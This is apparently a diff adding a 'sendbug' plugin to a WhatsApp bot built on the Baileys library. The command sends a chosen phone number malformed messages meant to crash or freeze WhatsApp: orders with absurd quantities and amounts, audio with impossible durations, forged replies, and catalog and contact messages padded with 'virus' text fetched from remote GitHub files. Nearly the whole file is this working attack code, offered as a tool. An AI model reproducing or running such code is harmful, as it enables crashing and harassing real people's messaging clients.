@@ -1,0 +1,213 @@
+import pkg from '@adiwajshing/baileys'
+import fs from 'fs'
+import fetch from 'node-fetch'
+import { sticker } from '../lib/sticker.js'
+const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = pkg
+let handler  = async (m, { conn, args, text, command, usedPrefix, participants }) => {
+	let thumb = fs.readFileSync('./thumbnail.jpg')
+	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
+	let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
+	
+	const from = m.key.remoteJid
+	let q = `Bug Tag From \n${text}`
+	
+	//==================( Quoted ) =================//
+	//# Kal
+	const kal = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },
+	"message": {
+		"extendedTextMessage": {
+			"text": packname,
+			"previewType": "NONE",
+			"contextInfo": {
+				"stanzaId": "3EB0382EDBB2",
+				"participant": "@s.whatsapp.net"
+			}
+		}
+	}}
+	//=================================================//		
+	//# Troli
+	const trol = { key: { fromMe: false, fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
+	"message": {
+		"orderMessage": {
+			"orderId": "594071395007984",
+			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
+			"itemCount": 100000000000,
+			"status": "INQUIRY",
+			"surface": "CATALOG",
+			"message": "",
+			"orderTitle": packname,
+			"sellerJid": "62857887347569@s.whatsapp.net",
+			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
+			"totalAmount1000": "500000000000000",
+			"totalCurrencyCode": "IDR"
+		}
+	}}
+	//#Troli 2
+	const ftrolii = { key: { fromMe: false, "participant":"0@s.whatsapp.net", "remoteJid": "@g.us"},
+	"message": {
+		orderMessage: { 		itemCount: 100000000000,
+			status: 200, 		thumbnail: thumb, 		surface: 200, 		message: `© ${packname}`,
+			token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
+			totalAmount1000: "500000000000000",
+			totalCurrencyCode: "IDR",
+			orderTitle: `${packname} ${virus2}`,
+			sellerJid: '0@s.whatsapp.net'}}, 		contextInfo: { "forwardingScore":999,"isForwarded":true },
+		sendEphemeral: true
+	}	
+	//=================================================//	
+	//# Sticker
+	const bugstik = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": {
+		"orderMessage": {
+			"orderId": "594071395007984",
+			"thumbnail": fs.readFileSync('./thumbnail.jpg'),
+			"itemCount": 100000000000,
+			"status": "INQUIRY",
+			"surface": "CATALOG",
+			"message": packname,
+			"orderTitle": packname,
+			"sellerJid": "62857887347569@s.whatsapp.net",
+			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
+			"totalAmount1000": "500000000000000",
+			"totalCurrencyCode": "IDR"
+		}
+	}}
+	//=================================================//
+	//# Pdf
+	const bugpdf = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
+	message: {
+		"imageMessage": { "mimetype": "image/jpeg", "caption": packname, "jpegThumbnail": thumb
+		}
+	}}
+	//=================================================//   
+	//# Vn
+	const adehvn = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
+	"message": {
+		"locationMessage": {}
+	}} 
+	//=================================================//	   
+	//# Image
+	const bugimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
+		"message": {
+			"audioMessage": {
+				"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
+				"mimetype": "audio/aac",
+				"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
+				"fileLength": "285473",
+				"seconds": 9999999999,
+				"caption": packname,
+				"ptt": false,
+				"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
+				"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
+				"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
+				"mediaKeyTimestamp": "1632753911"
+			}
+		}
+	}
+	//=================================================//		
+	//# Catalog
+	const messa = await prepareWAMessageMedia({ image: fs.readFileSync('./thumbnail.jpg') }, { upload: conn.waUploadToServer })
+	const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+		"productMessage": {
+		"product": {
+			"productImage": messa.imageMessage,
+			"productId": "4383282311765462",
+			"title": packname,
+			"description": virus2,
+			"currencyCode": "IDR",
+			"bodyText": virus,
+			"footerText": packname,
+			"priceAmount1000": "10000000",
+			"productImageCount": 1,
+			"firstImageId": 1,
+			"salePriceAmount1000": "10000000",
+			"retailerId": packname,
+			"url": "wa.me/62881037044211"
+		},
+			"businessOwnerJid": "62881037044211@s.whatsapp.net",
+		}
+	}), { userJid: m.chat, quoted: ftrolii })	
+	//=================================================//	
+	//# Contact
+	const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${packname}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${packname}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
+	//=================================================//   
+	//# Text
+	const main = {
+		"key": {
+			"fromMe": false,
+			"participant": "0@s.whatsapp.net",
+			...({"remoteJid":''})
+			},
+		"message":{
+			"imageMessage":{
+				"mimetype":"image/jpeg",
+				"jpegThumbnail":fs.readFileSync('./thumbnail.jpg')
+			}
+		}
+	}
+	//=================================================//   
+
+let nomor = args[0]
+let bugg = args[1]
+let jumlah = args[2]
+
+if (!nomor) throw '[ ⚠️ ] HARAP MASUKKAN NOMOR'
+if (!bugg) throw '[ ⚠️ ] HARAP MASUKKAN BUGG'
+if (jumlah && isNaN(jumlah)) throw '[ ⚠️ ] HARAP MASUKKAN JUMLAH'
+let fixedNumber = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : nomor ? (nomor.replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
+let fixedJumlah = jumlah ? jumlah * 1 : 10
+if (fixedJumlah > 10) throw '[ ⚠️ ] TERLALU BANYAK PESAN! JUMLAH HARUS KURANG DARI 10 PESAN'
+
+if (bugg == 'vn') {
+for (let i = fixedJumlah; i > 1; i--) {
+			if (i !== 0) return conn.sendMessage(fixedNumber, {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
+		}}
+		if (bugg == 'pdf') {
+		for (let i = fixedJumlah; i > 1; i--) {
+			if (i !== 0) return conn.sendMessage(fixedNumber, {document: thumb, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})
+		}}
+		if (bugg == 'sticker') {
+		for (let i = fixedJumlah; i > 1; i--) {
+			let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.packname, global.author)
+			if (i !== 0) return conn.sendFile(fixedNumber, stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
+		}}
+		if (bugg == 'bugimg') {
+		for (let i = fixedJumlah; i > 1; i--) {
+			if (i !== 0) return conn.sendMessage(fixedNumber, {image: thumb, bugimage }, {quoted: bugimage})
+		}}
+		if (bugg == 'bugcrash') {
+		for (let i = fixedJumlah; i > 1; i--) {
+			if (i !== 0) return conn.fakeReply(fixedNumber, 'A', '622150996855@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
+			if (i !== 0) return conn.fakeReply(fixedNumber, 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast')
+			if (i !== 0) return conn.fakeReply(fixedNumber, 'A', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
+			if (i !== 0) return conn.fakeReply(fixedNumber, 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
+			if (i !== 0) return conn.fakeReply(fixedNumber, 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
+			if (i !== 0) return conn.fakeReply(fixedNumber, 'A', '447710173736@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
+		}}
+		if (bugg == 'reactpc') {
+		for (let i = fixedJumlah; i > 1; i--) {
+			if (i !== 0) return conn.sendMessage(fixedNumber, {text: packname }, {quoted: trol})
+		}}
+		if (bugg == 'bugtag') {
+		for (let i = fixedJumlah; i > 1; i--) {
+			if (!m.isGroup) return global.dfail('group',m,conn)
+			if (i !== 0) return conn.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: kal })
+		}}
+		if (bugg == 'bugcatalog') {
+		for (let i = fixedJumlah; i > 1; i--) {
+			if (i !== 0) return conn.relayMessage(fixedNumber, catalog.message, { messageId: catalog.key.id })
+		}}
+		if (bugg == 'bugtextcrash') {
+		for (let i = fixedJumlah; i > 1; i--) {
+			if (i !== 0) return conn.reply(fixedNumber, packname, main)
+		}}
+		if (bugg == 'bugvid') {
+		for (let i = fixedJumlah; i > 1; i--) {
+			if (i !== 0) return conn.sendMessage(fixedNumber, {video: thumb, bugimage, }, {quoted: bugimage})
+		}}
+
+}
+handler.help = ['sendbug']
+handler.tags = ['tools']
+handler.command = /^(bugg)$/i
+
+export default handler
